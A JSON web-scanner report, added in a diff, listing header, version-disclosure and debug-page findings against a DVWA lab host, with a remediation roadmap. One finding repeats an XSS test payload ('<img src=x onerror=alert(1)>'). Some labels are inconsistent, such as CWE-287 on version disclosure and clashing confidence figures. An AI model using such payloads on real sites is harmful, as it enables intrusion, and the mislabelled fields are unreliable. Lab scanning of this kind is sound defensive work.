+      "parameter": "x-content-type-options",
+      "description": "Without nosniff, browsers may MIME-sniff responses, enabling content injection.",
+      "evidence": "Header 'x-content-type-options' not present in response",
+      "remediation": "Add: X-Content-Type-Options: nosniff",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: x-content-type-options",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Header 'x-content-type-options' not present in response",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing X-Content-Type-Options Header"
+      ],
+      "validation_logic": "Per Rule 7: missing security headers are configuration issues, not directly exploitable vulnerabilities. Severity capped unless an exploit chain is demonstrated. Header 'x-content-type-options' absence represents a legitimate risk and is not downgraded.",
+      "fp_checks_performed": [
+        "header_missing_only_check"
+      ],
+      "exploitability": "Not directly exploitable. Requires additional attacker conditions (e.g., MITM, social engineering, co-located vulnerability) to leverage."
+    },
+    {
+      "id": "WEB-D00BF3BE",
+      "title": "Server Version Disclosure in Header",
+      "severity": "LOW",
+      "confidence": 0.95,
+      "confidence_pct": 95,
+      "cvss_score": 2.7,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: Server: Apache/2.2.8 (Ubuntu) DAV/2",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "Server",
+      "description": "The 'Server' header discloses server software and version: 'Apache/2.2.8 (Ubuntu) DAV/2'. This aids fingerprinting for targeted attacks.",
+      "evidence": "Server: Apache/2.2.8 (Ubuntu) DAV/2",
+      "remediation": "Configure the server to emit a generic 'Server' header or omit it entirely.",
+      "cwe": "CWE-287",
+      "owasp": "A07:2021 – Identification and Authentication Failures",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: Server",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Server: Apache/2.2.8 (Ubuntu) DAV/2",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Server Version Disclosure in Header"
+      ],
+      "validation_logic": "Confidence 95% based on engine detection. Evidence: Server: Apache/2.2.8 (Ubuntu) DAV/2",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-9B0C132B",
+      "title": "Technology Disclosure via X-Powered-By Header",
+      "severity": "LOW",
+      "confidence": 0.95,
+      "confidence_pct": 95,
+      "cvss_score": 2.7,
+      "validation_status": "confirmed",
+      "exploit_status": "CONFIRMED",
+      "comparison_result": "Engine detection: X-Powered-By: PHP/5.2.4-2ubuntu5.10",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "X-Powered-By",
+      "description": "'X-Powered-By: PHP/5.2.4-2ubuntu5.10' discloses the application framework/runtime version.",
+      "evidence": "X-Powered-By: PHP/5.2.4-2ubuntu5.10",
+      "remediation": "Remove or suppress the X-Powered-By header in server/framework configuration.",
+      "cwe": "CWE-287",
+      "owasp": "A07:2021 – Identification and Authentication Failures",
+      "references": [],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: X-Powered-By",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: X-Powered-By: PHP/5.2.4-2ubuntu5.10",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Technology Disclosure via X-Powered-By Header"
+      ],
+      "validation_logic": "Confidence 95% based on engine detection. Evidence: X-Powered-By: PHP/5.2.4-2ubuntu5.10",
+      "fp_checks_performed": [],
+      "exploitability": "Evidence supports exploitability as described."
+    },
+    {
+      "id": "WEB-C17E750E",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Referrer-Policy Header",
+      "severity": "LOW",
+      "confidence": 0.95,
+      "confidence_pct": 95,
+      "cvss_score": 2.0,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: header 'referrer-policy' absent from server response. No exploit demonstrated — classified as configuration gap.",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "referrer-policy",
+      "description": "No Referrer-Policy means browsers use their default, potentially leaking URLs.",
+      "evidence": "Header 'referrer-policy' not present in response",
+      "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin or no-referrer",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: referrer-policy",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Header 'referrer-policy' not present in response",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing Referrer-Policy Header"
+      ],
+      "validation_logic": "Per Rule 7: missing security headers are configuration issues, not directly exploitable vulnerabilities. Severity capped unless an exploit chain is demonstrated. Header 'referrer-policy' absence represents a legitimate risk and is not downgraded.",
+      "fp_checks_performed": [
+        "header_missing_only_check"
+      ],
+      "exploitability": "Not directly exploitable. Requires additional attacker conditions (e.g., MITM, social engineering, co-located vulnerability) to leverage."
+    },
+    {
+      "id": "WEB-37C85EAA",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Permissions-Policy Header",
+      "severity": "LOW",
+      "confidence": 0.9,
+      "confidence_pct": 90,
+      "cvss_score": 1.8,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Baseline: header 'permissions-policy' absent from server response. No exploit demonstrated — classified as configuration gap.",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "permissions-policy",
+      "description": "No Permissions-Policy leaves browser features (camera, geolocation, mic) unrestricted.",
+      "evidence": "Header 'permissions-policy' not present in response",
+      "remediation": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa",
+        "2. Identify parameter: permissions-policy",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: Header 'permissions-policy' not present in response",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: Missing Permissions-Policy Header"
+      ],
+      "validation_logic": "Per Rule 7: missing security headers are configuration issues, not directly exploitable vulnerabilities. Severity capped unless an exploit chain is demonstrated. Header 'permissions-policy' absence represents a legitimate risk and is not downgraded.",
+      "fp_checks_performed": [
+        "header_missing_only_check"
+      ],
+      "exploitability": "Not directly exploitable. Requires additional attacker conditions (e.g., MITM, social engineering, co-located vulnerability) to leverage."
+    },
+    {
+      "id": "WEB-739638A3",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-XSS-Protection Header",
+      "severity": "LOW",
+      "confidence": 0.9,
+      "confidence_pct": 35,
+      "cvss_score": 0.0,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Header 'x-xss-protection' not present",
+      "endpoint": "http://192.168.0.102/dvwa",
+      "parameter": "x-xss-protection",
+      "description": "X-XSS-Protection is deprecated in modern browsers but its absence may affect older browser support.",
+      "evidence": "Header 'x-xss-protection' not present",
+      "remediation": "Set X-XSS-Protection: 0 (to disable the buggy XSS auditor) and rely on CSP instead.",
+      "cwe": "CWE-693",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection"
+      ],
+      "timestamp": 1779221416.2541165,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "GET http://192.168.0.102/dvwa?x-xss-protection=<PAYLOAD> HTTP/1.1\nHost: (target)\nAccept: text/html\n",
+      "raw_response_excerpt": "Header 'x-xss-protection' not present",
+      "reproduction_steps": [
+        "1. Send GET/POST to http://192.168.0.102/dvwa with x-xss-protection=<img src=x onerror=alert(1)>",
+        "2. Inspect response HTML for unencoded tag.",
+        "3. Load in browser and verify onerror fires before classifying as XSS."
+      ],
+      "validation_logic": "Marker was reflected in the HTML body context. HTML body reflection requires a full tag injection to execute JavaScript. The test marker used (<xssXXX>) does not contain executable JavaScript. Manual testing with a real payload required to confirm execution.",
+      "fp_checks_performed": [
+        "xss_context_analysis",
+        "execution_context: html_body_no_exec_signal"
+      ],
+      "exploitability": "LOW — HTML body reflection. Test with <img src=x onerror=alert(1)> to determine if tags survive server-side sanitisation."
+    },
+    {
+      "id": "WEB-2ED0B1CA",
+      "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] robots.txt Accessible — /robots.txt",
+      "severity": "INFO",
+      "confidence": 0.5,
+      "confidence_pct": 50,
+      "cvss_score": 0.0,
+      "validation_status": "potential",
+      "exploit_status": "UNVERIFIED",
+      "comparison_result": "Engine detection: HTTP 200 for http://192.168.0.102/dvwa/robots.txt. Content: User-agent: *\r\nDisallow: /",
+      "endpoint": "http://192.168.0.102/dvwa/robots.txt",
+      "parameter": "",
+      "description": "robots.txt is publicly accessible. Review for sensitive path disclosures. Existence alone is not a vulnerability.",
+      "evidence": "HTTP 200 for http://192.168.0.102/dvwa/robots.txt. Content: User-agent: *\r\nDisallow: /",
+      "remediation": "Review robots.txt for paths that reveal internal application structure. Do not rely on robots.txt to hide sensitive endpoints.",
+      "cwe": "CWE-538",
+      "owasp": "A05:2021 – Security Misconfiguration",
+      "references": [
+        "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"
+      ],
+      "timestamp": 1779221436.6582785,
+      "module": "general",
+      "proof_of_concept": "",
+      "raw_request": "",
+      "raw_response_excerpt": "",
+      "reproduction_steps": [
+        "1. Navigate to endpoint: http://192.168.0.102/dvwa/robots.txt",
+        "2. Identify parameter: ",
+        "3. Send the following test payload (see Raw Request).",
+        "4. Observe response for: HTTP 200 for http://192.168.0.102/dvwa/robots.txt. Content: User-agent: *\r\nDisallow: /",
+        "5. Compare against baseline to confirm anomaly.",
+        "6. Title: robots.txt Accessible — /robots.txt"
+      ],
+      "validation_logic": "Confidence 50% based on engine detection. Evidence: HTTP 200 for http://192.168.0.102/dvwa/robots.txt. Content: User-agent: *\r\nDisallow: /",
+      "fp_checks_performed": [],
+      "exploitability": "Requires manual verification to assess full impact scope."
+    }
+  ],
+  "remediation_roadmap": [
+    {
+      "owasp_category": "A01:2021 — Broken Access Control",
+      "severity": "CRITICAL",
+      "findings": [
+        {
+          "id": "DVWA-241969B6",
+          "title": "DVWA Module Accessible — upload",
+          "cvss_score": 9.8,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/upload/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        },
+        {
+          "id": "DVWA-9D1EE6E3",
+          "title": "DVWA Module Accessible — fi",
+          "cvss_score": 9.0,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/fi/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        },
+        {
+          "id": "DVWA-A05A8C24",
+          "title": "DVWA Module Accessible — sqli",
+          "cvss_score": 8.8,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/sqli/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        },
+        {
+          "id": "DVWA-94F6547D",
+          "title": "DVWA Module Accessible — csrf",
+          "cvss_score": 7.5,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/csrf/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        },
+        {
+          "id": "DVWA-31425CB4",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] DVWA Module Accessible — xss_s",
+          "cvss_score": 8.2,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/xss_s/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        },
+        {
+          "id": "DVWA-DEBE6070",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] DVWA Module Accessible — xss_r",
+          "cvss_score": 7.2,
+          "cwe": "CWE-1035",
+          "endpoint": "http://192.168.0.102/dvwa/vulnerabilities/xss_r/",
+          "remediation": "DVWA is intentionally vulnerable. Use only in isolated lab environments. Never expose DVWA to the internet or production networks."
+        }
+      ],
+      "generic_advice": "Enforce server-side access controls on every endpoint. Implement least-privilege and deny-by-default policies."
+    },
+    {
+      "owasp_category": "A02:2021 – Cryptographic Failures",
+      "severity": "HIGH",
+      "findings": [
+        {
+          "id": "WEB-BC677822",
+          "title": "Application Served Over HTTP (No TLS)",
+          "cvss_score": 7.5,
+          "cwe": "CWE-326",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Enforce HTTPS for all endpoints. Obtain a TLS certificate and redirect all HTTP traffic to HTTPS. Configure HSTS."
+        }
+      ],
+      "generic_advice": "Enforce TLS 1.2+ with HSTS. Rotate secrets regularly. Use strong, well-reviewed cryptographic algorithms."
+    },
+    {
+      "owasp_category": "A05:2021 – Security Misconfiguration",
+      "severity": "HIGH",
+      "findings": [
+        {
+          "id": "WEB-44825345",
+          "title": "Accessible Admin/Debug Endpoint — /phpinfo",
+          "cvss_score": 7.5,
+          "cwe": "CWE-215",
+          "endpoint": "http://192.168.0.102/dvwa/phpinfo",
+          "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production)."
+        },
+        {
+          "id": "WEB-D3B83B49",
+          "title": "Accessible Admin/Debug Endpoint — /docs",
+          "cvss_score": 7.5,
+          "cwe": "CWE-215",
+          "endpoint": "http://192.168.0.102/dvwa/docs",
+          "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production)."
+        },
+        {
+          "id": "WEB-719DCC60",
+          "title": "Accessible Admin/Debug Endpoint — /docs/",
+          "cvss_score": 7.5,
+          "cwe": "CWE-215",
+          "endpoint": "http://192.168.0.102/dvwa/docs/",
+          "remediation": "Remove or restrict all debug and admin endpoints in production. Use IP allowlisting or VPN for administrative interfaces. Disable framework debug modes (debug=False, RAILS_ENV=production)."
+        },
+        {
+          "id": "WEB-8E4A6745",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-Frame-Options Header",
+          "cvss_score": 4.3,
+          "cwe": "CWE-693",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Add: X-Frame-Options: DENY or SAMEORIGIN. Prefer CSP frame-ancestors directive."
+        },
+        {
+          "id": "WEB-7323C3DF",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Sensitive File Exposed — /phpinfo.php",
+          "cvss_score": 3.1,
+          "cwe": "CWE-538",
+          "endpoint": "http://192.168.0.102/dvwa/phpinfo.php",
+          "remediation": "Block direct access to '/phpinfo.php' via web server configuration. Move sensitive files outside the web root. Audit deployment scripts to prevent secrets from being committed."
+        },
+        {
+          "id": "WEB-286FCC60",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-Content-Type-Options Header",
+          "cvss_score": 2.7,
+          "cwe": "CWE-693",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Add: X-Content-Type-Options: nosniff"
+        },
+        {
+          "id": "WEB-C17E750E",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Referrer-Policy Header",
+          "cvss_score": 2.0,
+          "cwe": "CWE-693",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin or no-referrer"
+        },
+        {
+          "id": "WEB-37C85EAA",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Permissions-Policy Header",
+          "cvss_score": 1.8,
+          "cwe": "CWE-693",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Add: Permissions-Policy: camera=(), microphone=(), geolocation=()"
+        },
+        {
+          "id": "WEB-739638A3",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing X-XSS-Protection Header",
+          "cvss_score": 0.0,
+          "cwe": "CWE-693",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Set X-XSS-Protection: 0 (to disable the buggy XSS auditor) and rely on CSP instead."
+        },
+        {
+          "id": "WEB-2ED0B1CA",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] robots.txt Accessible — /robots.txt",
+          "cvss_score": 0.0,
+          "cwe": "CWE-538",
+          "endpoint": "http://192.168.0.102/dvwa/robots.txt",
+          "remediation": "Review robots.txt for paths that reveal internal application structure. Do not rely on robots.txt to hide sensitive endpoints."
+        }
+      ],
+      "generic_advice": "Harden server configuration, remove debug/default pages, set security headers (CSP, X-Frame-Options, HSTS, etc.)."
+    },
+    {
+      "owasp_category": "A07:2021 – Identification and Authentication Failures",
+      "severity": "MEDIUM",
+      "findings": [
+        {
+          "id": "WEB-DB12D269",
+          "title": "Session Cookie Missing HttpOnly — PHPSESSID",
+          "cvss_score": 5.4,
+          "cwe": "CWE-287",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Set the HttpOnly flag on all session and authentication cookies."
+        },
+        {
+          "id": "WEB-D00BF3BE",
+          "title": "Server Version Disclosure in Header",
+          "cvss_score": 2.7,
+          "cwe": "CWE-287",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Configure the server to emit a generic 'Server' header or omit it entirely."
+        },
+        {
+          "id": "WEB-9B0C132B",
+          "title": "Technology Disclosure via X-Powered-By Header",
+          "cvss_score": 2.7,
+          "cwe": "CWE-287",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Remove or suppress the X-Powered-By header in server/framework configuration."
+        }
+      ],
+      "generic_advice": "Implement MFA, enforce strong password policies, use secure session management and token rotation."
+    },
+    {
+      "owasp_category": "A03:2021 – Injection",
+      "severity": "MEDIUM",
+      "findings": [
+        {
+          "id": "WEB-939FA5E0",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing Content-Security-Policy Header",
+          "cvss_score": 5.3,
+          "cwe": "CWE-79",
+          "endpoint": "http://192.168.0.102/dvwa",
+          "remediation": "Define a strict CSP. Start with default-src 'self'; script-src 'self'; and tighten progressively."
+        }
+      ],
+      "generic_advice": "Use parameterised queries / prepared statements. Apply strict input validation and output encoding."
+    },
+    {
+      "owasp_category": "A01:2021 – Broken Access Control",
+      "severity": "MEDIUM",
+      "findings": [
+        {
+          "id": "WEB-D29BE772",
+          "title": "[POTENTIAL ISSUE — MANUAL VALIDATION REQUIRED] Missing CSRF Token — http://192.168.0.102/login.php",
+          "cvss_score": 4.3,
+          "cwe": "CWE-352",
+          "endpoint": "http://192.168.0.102/login.php",
+          "remediation": "Add a cryptographically random CSRF token to every state-changing form. Validate the token server-side on every POST/PUT/DELETE request. Use the SameSite=Strict or SameSite=Lax cookie attribute."
+        }
+      ],
+      "generic_advice": "Enforce server-side access controls on every endpoint. Implement least-privilege and deny-by-default policies."
+    }
+  ],
+  "attack_surface": {
+    "urls": [
+      "http://192.168.0.102/dvwa",
+      "https://192.168.0.102/dvwa/"
+    ],
+    "forms": 1,
+    "parameters": {},
+    "technologies": [
+      "PHP",
+      "Apache"
+    ],
+    "js_files": [],
+    "api_endpoints": [],
+    "graphql_endpoints": [],
+    "websocket_endpoints": [],
+    "wasm_files": [],
+    "service_workers": [],
+    "import_maps": []
+  },
+  "tool_outputs": {
+    "whatweb": {
+      "available": false,
+      "error": "whatweb not found in PATH"
+    },
+    "nmap": {
+      "available": false,
+      "error": "nmap not found in PATH"
+    },
+    "nikto": {
+      "available": false,
+      "error": "nikto not found in PATH"
+    },
+    "nuclei": {
+      "available": false,
+      "error": "nuclei not found in PATH"
+    },
+    "subfinder": {
+      "available": false,
+      "error": "subfinder not found in PATH"
+    },
+    "gau": {
+      "available": false,
+      "error": "gau not found in PATH"
+    }
+  },
+  "scan_errors": []
+}
